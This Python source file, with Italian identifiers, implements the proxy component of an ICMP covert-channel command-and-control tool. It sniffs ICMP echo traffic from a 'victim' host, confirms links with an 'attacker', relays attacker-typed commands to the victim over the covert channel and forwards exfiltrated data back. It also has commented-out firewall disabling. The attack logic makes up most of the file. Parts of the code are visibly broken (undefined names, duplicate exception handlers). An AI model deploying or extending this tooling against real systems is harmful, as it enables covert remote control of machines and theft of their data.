#from scapy.all import * 
from scapy.all import IP, ICMP, Raw 

import ipaddress
import sys 
import os 
import argparse  
import threading 
import json 
import socket 

from mymethods import *
from mymethods import ARGS_CONFIG 
from scapy.all import * 
from network_methods import *

#file_path = "./attacksingleton.py"
#directory = os.path.dirname(file_path)
#sys.path.insert(0, directory)
#import attacksingleton 
from attacksingleton import * 
from attacksingleton import _IPx 
from check_type import * 
from custom_enum import SENDER_TRUE_SENDER, ATTACK_TYPE, ENTITY
from get_type import *



def update_data_received(data, data_lock:threading.Lock, data_received):
    data_lock.acquire()
    data_received.append(data)
    data_lock.release() 

DEBUG=False  
default_file_path:str = "./attack_file.json" 
type_sender=SENDER_TRUE_SENDER 
use_delay=False 
timeout_time=20
#--------------------------------    
class PROXY_THREAD: 
    class VICTIM_CONNECTION: 
        thread:threading.Thread=None 
        
        def __init__(self): 
            def timeout_timer(): 
                #if not isinstance(oggetto.thread_data,THREAD_VAR): 
                #    raise TypeError("oggetto non è THREAD_VAR",type(oggetto.thread_data)) 
                #if not is_threading_Lock(oggetto.thread_data.lock): 
                #    raise TypeError("lock non valido") 
                #if not is_boolean(oggetto.thread_data.response): 
                #    raise TypeError("response non valida")  
                #oggetto.stop_flag["value"]=True 
                #oggetto.thread_data.update_response(False) 
                THREADING_EVENT.set(self.event_pktconn) 
            self.lock:threading.Lock=get_threading_Lock()  
            self.response:bool=False  
            self.event_pktconn=get_threading_Event() 
            #if not is_threading_Event(event_pktconn): 
            #    raise TypeError("event_pktconn is not threading.Event",type(event_pktconn)) 
            self.timer:threading.Timer=get_timer(timeout_time, lambda: timeout_timer()) 
            #if not is_threading_Timer(timer): 
            #    raise TypeError("timer is not threading.Timer",type(timer))  
        
        def start(self, ip_vittima:ipaddress.IPv4Address=None, ip_host:ipaddress.IPv4Address=None): 
            def get_filter(): 
                #checksum=CALC.checksum(confirm_text.strip().encode()) 
                IPv4_ECHO_REQU=8 
                IPv4_ECHO_REP=0 
                if ip_vittima.version==4: 
                    icmp="icmp " 
                elif ip_vittima.version==6: 
                    icmp="icmp6 "  
                if DEBUG: 
                    filter=f"({icmp} or tcp) "
                    #filter+=f" and src {oggetto.ip_vittima.compressed} "
                    filter+=f" and dst {ip_host.compressed}"
                    print("FILTER",filter)
                    return filter
                else: 
                    filter=icmp 
                    filter+=f" and (icmp[0]=={IPv4_ECHO_REQU} or icmp[0]=={IPv4_ECHO_REP}) " 
                    filter+=f" and src {ip_vittima.compressed} "
                    filter+=f" and dst {ip_host.compressed}"
                #filter+=f"and icmp[4:2]={checksum} "
                print("FILTER",filter)
                return filter 
            def callback_connessione(packet):  
                #print(packet.summary()) 
                if packet.haslayer(IP) and packet.haslayer(ICMP) and packet.haslayer(Raw): 
                    #and (pkt["ICMP"].type==8 or pkt["ICMP"].type==0): 
                    if not oggetto.ip_vittima.compressed==packet[IP].src: 
                        return 
                    confirm_text=(
                        MSG.CONFIRM_VICTIM.value+
                        oggetto.ip_vittima.compressed+
                        oggetto.ip_host.compressed
                    )
                    check_sum=CALC.checksum(confirm_text.encode()) 
                    if confirm_text in packet[Raw].load.decode(): 
                        print("CONNESSIONE VITTIMA CONFERMATA") 
                        oggetto.thread_data.update_response(True) 
                        oggetto.stop_flag["value"]=True 
                        THREADING_EVENT.set(event_pktconn) 
                        return        
            def _old_get_callback(event_pktconn:threading.Event): 
                #print("MONITORO IL TRAFFICO PER CONFERME DALLA VITTIMA")
                def callback(packet): 
                    print(packet.summary()) 
                    if packet.haslayer(IP) and packet.haslayer(ICMP) and packet.haslayer(Raw):   
                        if not oggetto.ip_vittima.compressed==packet[IP].src: 
                            return
                        confirm_text=(
                            MSG.CONFIRM_VICTIM.value+
                            oggetto.ip_vittima.compressed+
                            oggetto.ip_host.compressed
                        )
                        check_sum=CALC.checksum(confirm_text.encode()) 
                        if confirm_text in packet[Raw].load.decode(): 
                            print("CONNESSIONE VITTIMA CONFERMATA") 
                            THREADING_EVENT.set(event_pktconn) 
                            return 
                return callback 
            def stop_filter(pkt): 
                return oggetto.stop_flag["value"]  
            def _old_sniff(): 
                timer:threading.Timer=get_timer(timeout_time, lambda: timeout_timer()) 
                timer.start() 
                confirm_text=(
                    MSG.CONFIRM_VICTIM.value+
                    oggetto.ip_vittima.compressed+
                    oggetto.ip_host.compressed
                )  
                sniff( 
                    filter=get_filter(confirm_text)
                    ,prn=get_callback()
                    ,store=False 
                    ,stop_filter=stop_filter 
                )
            #-----------------------------------
            if not is_ipaddress(ip_vittima): 
                raise TypeError("Vittima non ha un IP valido")
            if not is_ipaddress(ip_host): 
                raise TypeError("Host non ha un IP valido") 
            self.interface=INTERFACE_FROM_IP(ip_vittima).interface 
            if self.interface is None: 
                raise ValueError("interface is None",self.interface) 
            sniff_args={
                "filter":get_filter()
                #,"count":1 
                ,"prn":callback_connessione
                #,"store":True 
                ,"iface":self.interface 
            } 
            sniffer:AsyncSniffer=get_AsyncSniffer(sniff_args) 
            if not is_AsyncSniffer(sniffer): 
                raise TypeError("sniffer is AsyncSniffer",type(sniffer)) 
            sniffer.start()
            if sniffer.running: 
                print("Sniffer started...") 
            else: raise RuntimeError("SNIFFER NOT STARTED") 
            self.timer.start() 
            if self.timer.is_alive(): 
                print("Timer started...") 
        
        def wait(self): 
            THREADING_EVENT.wait(self.event_pktconn) 
            if self.timer.is_alive(): 
                self.timer.cancel()
                print("Timer stopped...") 
            self.sniffer.stop()
            if self.sniffer.running: 
                raise RuntimeError("SNIFFER NOT STOPPED",self.sniffer.running)
            print("Sniffer stopped...") 

        def update_response(self, response:bool=False): 
            if not is_boolean(response): 
                raise TypeError("response non boolean")
            if not is_threading_Lock(self.lock): 
                raise TypeError("lock non valido")  
            with self.lock:
                self.response=response 

attacker_mode=True 
localhost="127.0.0.1" 
class Proxy:  
    socket_attacker:socket=None #tuple[socket, _RetAddress]
    thread_data:THREAD_VAR=None 
    stop_flag={"value":False} 

    def __init__(self, ip_attaccante:ipaddress.IPv4Address=None, proxy_port:int=None ): 
        def get_ip_host(): 
            ip_host, errore=IP.find_local_IP() 
            if errore:
                print("errore:",errore)  
                msg="Inserire indirizzo IP dell'host:\n\t#" 
                try: 
                    ip_host=ipaddress.ip_address(input(msg)) 
                except Exception as e: 
                    print(e) 
                    return None
            try: 
                #TODO eliminare alla fine
                #self.ip_host=ipaddress.ip_address("192.168.56.104") 
                ip_host=ipaddress.ip_address(ip_host) 
            except Exception as e: 
                print(e) 
                return None
            print(f"ip_host: {type(ip_host)} {ip_host}") 
            return ip_host
        def attacker_mode(): 
            config_file=None 
            if not os.path.exists(default_file_path) or not str(default_file_path).endswith(".json"):
                raise FileNotFoundError(f"Il file {default_file_path} non esiste") 
            with open(default_file_path, 'r') as file: 
                print(f"File di configurazione {default_file_path} caricato correttamente") 
                config_file= json.load(file) 
            self.attack_function=ATTACK_TYPE.get_attack_method(config_file.get("attack_function"))
            if not is_enum_member(self.attack_function,ATTACK_TYPE): 
                self.attack_function=ATTACK_TYPE.choose_attack_function() 
            print(f"ATTACCO:",self.attack_function) 
            self.ip_vittima = ipaddress.ip_address(config_file.get("ip_vittima", None))   
            if not is_ipaddress(self.ip_vittima):
                raise TypeError("ip_vittima non valido") 
            print(f"IP VITTIMA",self.ip_vittima) 
        #-------------------------- 
        if not is_ipaddress(ip_attaccante): 
            raise TypeError("Indirizzo IP attaccante non valido")  
        if not is_integer(proxy_port): 
            raise TypeError("Porta non valida") 
        self.proxy_port=proxy_port
        self.ip_attaccante:ipaddress.IPv4Address=ip_attaccante
        self.ip_vittima:ipaddress.IPv4Address=None 
        self.ip_host:ipaddress.IPv4Address=None 
        self.exfiltred_data:list=[] 
        self.attack_function:ATTACK_TYPE=None  
        while not is_ipaddress(self.ip_host): 
            self.ip_host=get_ip_host() 
        print(f"IP HOST",self.ip_host) 
        if self.ip_attaccante.compressed==localhost: 
            self.ip_attaccante=self.ip_host 
        print(f"IP ATTACCANTE: {self.ip_attaccante}") 
        if attacker_mode: 
            return attacker_mode() 
    
    def start(self): 
        def connessione_attaccante():  
            #--------------------------------
            #with self.socket_attacker: 
            #socket.create_server(addr, family=socket.AF_INET6, dualstack_ipv6=True) #socket 4 both ipv4 and ipv6 
            while True: 
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s: 
                    print(f"Server listening: {s}")  
                    #s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
                    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) 
                    s.bind(
                        (self.ip_host.compressed, self.proxy_port)
                        #("192.168.56.104", 4567) 
                        #(socket.gethostname(), 4567)
                    ) 
                    s.listen(1) 
                    accepted_socket,accepted_addr=s.accept() 
                    #accepted_addr=ipaddress.ip_address(accepted_addr)
                    if accepted_addr==self.ip_attaccante.compressed: 
                        print("Stabilita connessione con attaccante: ", accepted_addr) 
                        self.socket_attacker=accepted_socket 
                        break
                    accepted_socket.close() 
            print("SOCKET",accepted_socket) 
            data_received=""
            while True:
                proxy.socket.settimeout(10) 
                chunk=proxy.socket.recv(1024).decode() 
                if not chunk: break
                data_received+=chunk
                if MSG.END_SOCKETSEND.value in data_received: 
                    data_received=data_received.replace(MSG.END_SOCKETSEND.value,"")
                    break  
            if MSG.CONFIRM_ATTACKER.value not in data_received: 
                peer = self.socket_attacker.getpeername() #self.socket_attacker[0]
                self.socket_attacker.close()  
                raise ValueError(f"Invalid data from {peer}:\t{data_received}")  
            print("Dati ricevuti: ", data_received) 
            if MSG.CONFIRM_ATTACKER.value not in data: 
                raise ValueError("Il messagigo non contiene l'indirizzo IP della vittima:",data_received) 
            if not MSG.ATTACK_FUNCTION.value in data: 
                raise ValueError("Il messagigo non contiene la tipologia di attacco utilizzato:",data_received) 
            for data in data_received.split("||"):
                if MSG.CONFIRM_ATTACKER.value in data: 
                    self.ip_vittima=ipaddress.ip_address(
                        data.replace(MSG.CONFIRM_ATTACKER.value,"") 
                    )
                    print(f"IP vittima: {type(self.ip_vittima)} : {self.ip_vittima}")
                elif MSG.ATTACK_FUNCTION.value in data:  
                    self.attack_function=ATTACK_TYPE.get_attack_method(
                        data.replace(MSG.ATTACK_FUNCTION.value,"").strip()
                    )
                    print(f"Func attacco: {type(self.attack_function)} : {self.attack_function}") 
                else: print("UNKNOWN DATA",data) 
            data=(MSG.CONFIRM_PROXY.value+
                self.ip_vittima.compressed+
                self.ip_host.compressed
                )
            self.socket_attacker.sendall(data.encode()) 
        def connessione_vittima(): 
            thread_victim_connection=PROXY_THREAD.VICTIM_CONNECTION()
            thread_victim_connection.start(self.ip_vittima, self.ip_host) 
            if not is_enum_member(self.attack_function,ATTACK_TYPE): 
                raise TypeError("attack_function non valida")  
            #int_version=self.attack_function.name.replace("ipv","").split("_")[0]  
            #int_code=self.attack_function.value  
            #XORversion= ord("i") ^ int(int_version) 
            #XORcode= ord("p") ^ int(int_code)  
            #icmp_id=(XORversion<<8)+XORcode  
            confirm_text=(
                MSG.CONFIRM_PROXY.value+
                self.ip_vittima.compressed+
                self.attack_function.name 
            ) 
            SendSingleton(
                ATTACK_TYPE.ipv4_echo_payload, 
                SENDER_TRUE_SENDER, 
                False 
            ).send_data(confirm_text.encode(), self.ip_vittima) 
            print("Confirm sent to victim...") 
            print("Waiting thread to end...") 
            thread_victim_connection.wait()  
            with thread_victim_connection.lock: 
                response=thread_victim_connection.response
            print("Thread has been executed...") 
            if is_boolean(response): 
                print("Aggiorno attaccante...")
                update_attaccante(response)  
            if response: 
                print("Received confirm from victim...") 
            else: raise RuntimeError("Conferma non arrivata dalla vittima") 
        def update_attaccante(result:bool): 
            #AGGIORNO ATTACCANTE SU CONNESISONE CON VITTIMA
            if attacker_mode: 
                print("ATACKER_MODE->update_attaccante")
                return
            if not is_boolean(result): 
                raise TypeError("result non booleano") 
            if not is_ipaddress(self.ip_vittima): 
                raise TypeError("ip_vittima non valido") 
            if not is_ipaddress(self.ip_host): 
                raise TypeError("ip_host non valido") 
            if not isinstance(self.socket_attacker,socket): 
                if attacker_mode: 
                    print("ATTACKER MODE -> socket_attacker")
                else: raise TypeError("socket_attacker non valido") 
            data=(
                MSG.CONFIRM_VICTIM.value+
                self.ip_vittima.compressed+
                self.ip_host.compressed+
                str(result) 
            )  
            if attacker_mode: 
                print("ATTACKER MODE -> SendSingleton")
                SendSingleton(
                    ATTACK_TYPE.ipv4_echo_payload, 
                    SENDER_TRUE_SENDER, 
                    False 
                ).send_data(data.encode(), self.ip_host) 
            else: self.socket_attacker.sendall(data.encode())  
            print(f"Aggiornamento confermato all'attaccante")
            if not result:
                self.socket_attacker.close()
                raise SystemError("NON CONNESSO ALLA VITITMA",self.ip_vittima) 
            print("CONNESSO A",self.ip_vittima)  
        #--------------------------- 
        try:
            #FIREWALL.disable() 
            print("Controllo connesisone con attaccante")
            connessione_attaccante() 
            if not is_socket(self.socket_attacker) and not attacker_mode: 
                raise TypeError("socket non valido",self.socket_attacker)
            print("Connessione con attaccante stabilita") 
            print("Controllo connessione con vittima")
            connessione_vittima() 
            print("Waiting command from attacker...")
            self.comando_from_attaccante()  
        except Exception as e: 
            print(e) 
        finally: 
            pass 
            #FIREWALL.enable() 
        
    def comando_from_attaccante(self): 
        def get_command(): 
            if attacker_mode: 
                msg=f"Inserisci un comando da eseguire (o 'exit' per uscire):\n\t>>> "
                command=input(msg)  
                received_data=MSG.CONFIRM_COMMAND.value+command 
            else: 
                received_data=""
                while True:
                    self.socket_attacker.settimeout(10) 
                    chunk=self.socket_attacker.recv(1024).decode() 
                    if not chunk: break
                    received_data+=chunk
                    if MSG.END_SOCKETSEND.value in received_data: 
                        received_data=received_data.replace(MSG.END_SOCKETSEND.value,"")
                        break 
            return received_data
        def end_communication_wth_victim():
            if not is_ipaddress(self.ip_vittima):
                raise Exception(f"ip_vittima non validi ipaddress") 
            data=MSG.END_COMMUNICATION.value
            #SNIFFER.send_packet(data.encode(),ip_dst=ip_vittima) 
            SendSingleton(
                self.attack_function, 
                type_sender, 
                use_delay 
            ).send_data(data.encode(), self.ip_vittima) 
            print("VITTIMA AGGIORNATA") 
        def inoltra_dati(): 
            if not is_list(self.exfiltred_data) or len(self.exfiltred_data)<=0: 
                print("Nessun dato ricevuto") 
                self.socket_attacker.sendall(MSG.LAST_PACKET.value.encode()) if not attacker_mode else None
                raise Exception(f"Lista dati esfiltrati non valida:",type(self.exfiltred_data),self.exfiltred_data)  
            if attacker_mode: 
                return 
            for data in self.exfiltred_data:
                try: 
                    print("Inoltro:",data)  
                    if not is_bytes(data): 
                        data=bytes(data) 
                    self.socket_attacker.sendall(data) 
                except Exception as e: 
                    print("Conversione non riuscita",e)  
                except Exception as e:
                    print("Invio dati non riuscito",e) 
            self.socket_attacker.sendall(MSG.LAST_PACKET.value.encode()) 
        def reset(): 
            nonlocal received_command
            received_command=None
        #---------------------------
        wait_class=ReceiveSingleton(self.attack_function).wait_class
        if not isinstance(wait_class, _IPx):  
            raise TypeError("wait_class non _IPx",type(wait_class)) 
        while True: 
            thread_data=threading.Thread(target= lambda: wait_class.wait() ) 
            thread_data.start() 
            received_command=get_command()  
            if not is_string(received_command) or ([MSG.CONFIRM_COMMAND.value,MSG.WAIT_DATA.value] not in received_command):
                print("Messaggio comando non valido")
                continue
            if any(case in received_command for case in exit_cases): 
                print("received_command in exit_cases",received_command) 
                break 
            print("Received command:", received_command) 
            #data=wait_class.wait().data
            print(f"Aspetto che {self.ip_vittima} mandi i dati con il Covert Channel {self.attack_function.name} ") 
            if MSG.CONFIRM_COMMAND.value in received_command: 
                command= received_command.replace(MSG.CONFIRM_COMMAND.value,"").strip()
                print("COMANDO",command) 
                SendSingleton(
                    self.attack_function, 
                    type_sender, 
                    use_delay 
                ).send_data(command.encode(), self.ip_vittima) 
            elif MSG.WAIT_DATA.value in command:
                print("Aspetto i dati dalla vittima")
            else: 
                print(f"Caso non contemplato {received_command}")
            if thread_data.ident is not None:
                thread_data.join() 
            self.exfiltred_data=wait_class.data 
            print("DATA RECEIVED:",self.exfiltred_data)
            inoltra_dati() 
            reset()
        print("Interruzione programma") 
        end_communication_wth_victim() 
        self.socket_attacker.close()  if not attacker_mode else None
        
if __name__=="__main__": 
    args=ARGS_CONFIG.FROM_COMMAND(ENTITY.PROXY) 
    if not is_namespace(args): 
        exit(-1) 
    if int(args.proxy_port): 
        proxy_port=args.proxy_port
    if not is_string(args.ip_attaccante): 
        raise ValueError("IP attaccante non specificato") 
    ip_attaccante=None
    if args.ip_attaccante=="SELF": 
        attacker_mode=True
        ip_attaccante=ipaddress.ip_address(localhost)
    else: 
        attacker_mode=False
        ip_attaccante=ipaddress.ip_address(args.ip_attaccante)
    proxy=Proxy(ip_attaccante, proxy_port) 
    proxy.start()